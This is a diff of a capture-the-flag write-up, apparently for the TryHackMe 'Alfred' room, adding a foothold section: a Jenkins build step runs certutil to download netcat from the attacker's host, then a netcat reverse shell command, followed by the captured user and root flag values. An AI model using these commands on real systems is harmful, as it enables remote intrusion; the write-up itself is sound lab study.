@@ -171,21 +171,73 @@ Command console icon == webshell potentially? Worth exploration.
 
 Walked this project tab by tab.
 
-![Windows batch command](/assets/img/ctf/thm/easy/alfred/8.png)
-
 Jackpot. Configure has a 'Windows batch command' section under *Build*. It looks like we can issue commands directly to the OS.
-
-```powershell
-
-
-```
 
 
 ## Foothold
 
+### Revshell
+
+I'll try to get *netcat* over and get a revshell.
+
+```powershell
+certutil -f -urlcache http://10.21.42.166:8000/win/nc64.exe .\nc.exe
+```
+
+![Windows batch command](/assets/img/ctf/thm/easy/alfred/8.png)
+
+![build](/assets/img/ctf/thm/easy/alfred/9.png)
+
+Selecting *build* should trigger the command...now let's watch our httpserver log:
+
+![httpserver log](/assets/img/ctf/thm/easy/alfred/10.png)
+
+The command executed and was able to retrieve netcat. Now I'll setup a local listener and execute netcat from the $target to get a revshell.
+
+```powershell
+nc.exe 10.21.42.4444 -e cmd
+```
+
+![Executing netcat](/assets/img/ctf/thm/easy/alfred/11.png)
+
+And now we check our listener. I'm using *penelope* here for my lister on :4444
+
+![Penelope local listener](/assets/img/ctf/thm/easy/alfred/13.png)
+
+We got a foothold as user *bruce*.
+
 ### Foothold Recon
 
+
+
 ## Lateral Movement / Privilege Escalation
+
+```powershell
+c:\Users\bruce>type Desktop\user.txt
+type Desktop\user.txt
+79007a09481963edf2e1321abd9ae2a0
+c:\Users\bruce>type C:\Windows\System32\config
+
+type C:\Windows\System32\config
+Access is denied.
+
+c:\Users\bruce>
+c:\Users\bruce>type C:\Windows\System32\config\root.txt
+type C:\Windows\System32\config\root.txt
+dff0f748678f280250f25a45b8046b4a
+
+```
+```powershell
+C:\Program Files (x86)\Jenkins\workspace\project>for /r C:\ %f in (root.txt) do @if exist "%f" (echo %f & goto :found)                                                                                                   
+:found                                                                                                                                                                                                                   
+for /r C:\ %f in (root.txt) do @if exist "%f" (echo %f & goto :found)                                                                                                                                                    
+C:\Windows\System32\config\root.txt                                                                                                                                                                                      
+                                                                                                                                                                                                                         
+C:\Program Files (x86)\Jenkins\workspace\project>:found                                                                                                                                                                  
+C:\Program Files (x86)\Jenkins\workspace\project>type C:\Windows\System32\config\root.txt                                                                                                                                
+type C:\Windows\System32\config\root.txt                                                                                                                                                                                 
+dff0f748678f280250f25a45b8046b4a       
+```
 
 ## Root / SYSTEM
 
